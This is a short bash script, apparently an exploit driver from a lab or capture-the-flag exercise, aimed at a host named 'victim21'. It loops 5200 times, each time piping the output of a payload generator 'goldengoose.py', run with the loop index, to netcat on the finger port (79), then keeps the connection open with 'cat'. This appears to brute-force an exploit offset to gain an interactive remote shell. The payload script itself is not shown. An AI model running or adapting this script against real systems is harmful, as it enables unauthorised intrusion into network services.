#!/bin/bash
END=5200
for ((i=1;i<=END;i++));
do
   (python3 goldengoose.py $i && cat) | nc victim21 79
done
